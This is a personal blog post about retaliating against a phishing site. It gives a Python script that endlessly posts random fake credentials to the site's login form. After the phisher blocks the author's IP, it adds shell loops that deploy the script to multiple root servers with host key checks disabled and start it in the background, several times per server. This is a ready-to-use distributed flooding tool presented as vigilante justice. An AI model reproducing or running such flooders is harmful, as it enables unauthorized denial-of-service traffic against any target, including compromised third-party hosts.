---
author: Cristian Livadaru
categories:
- security
date: "2018-08-01T12:16:24Z"
description: ""
draft: false
image: https://images.unsplash.com/photo-1510251197878-a2e6d2cb590c?ixlib=rb-0.3.5&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=1080&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ&s=b63122614d1a6f228c5ebf24c2d5635c
slug: how-to-deal-with-phishing-sites
summary: |-
  I've been receiving some phishing mails aimed at Zimbra users.
  I could just delete and ignore them, but where's the fun in that?
tags:
- security
title: How to deal with phishing sites
---


Instead of just deleting the mail, I thought to strike back and flood the site with some fake data.
First, you need some proxy or a new server, you could use [DigitalOcean](https://m.do.co/c/bbc69fd7ab10) for example.
Then you need to get the form fields that need to be filled: 

![2018-08-01_15-54-42](__GHOST_URL__/content/images/2018/08/2018-08-01_15-54-42.png)

Put everything in this python script (source: https://en.internetwache.org/pwning-a-paypal-phishing-site-11-03-2013/) 

```python
#!/usr/bin/python2.7
 
import random
import urllib2
import urllib
 
SPAMURL="***"
 
def randstr(leng):
    res = ""
    for i in xrange(0,leng):
        res = res + str(chr(random.randint(65,125)))
    return res
def sendSpamReq(url):
    data = urllib.urlencode({'username':randstr(8)+"@"+randstr(3)+".de",
                             'password':randstr(12)
   })
    urllib2.urlopen(urllib2.Request(url,data))
count = 0
while True: 
    count=count+1
    try:
        sendSpamReq(SPAMURL)
        print "["+str(count)+"] Success"
    except:
        print "["+str(count)+"] Failed"
```

change the SPAMURL and the form fields accordingly (username and password in my case)
Run the script and leave it running, this will flood the phisher with a lot of fake data which will hopefully make the rest of the data they might have useless.

## Update

Apparently, after 4k Mails, the phisher blocked my IP. Looks like someone want's to play. Ok, let's go, my friend. 

![2018-08-01_16-48-38](__GHOST_URL__/content/images/2018/08/2018-08-01_16-48-38.png)

On your machine create a file called `flood-hosts` and add each IP of your server in this file, one line per IP. 

Then copy the file to each server

```
for dest in $(<flood-hosts); do
  scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null flood.py root@${dest}:/root/
done
```

and start it 

```
for dest in $(<flood-hosts); do
  ssh root@${dest} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "nohup python flood.py > /dev/null 2>&1 &"
done
```

and you can start it several times of course.

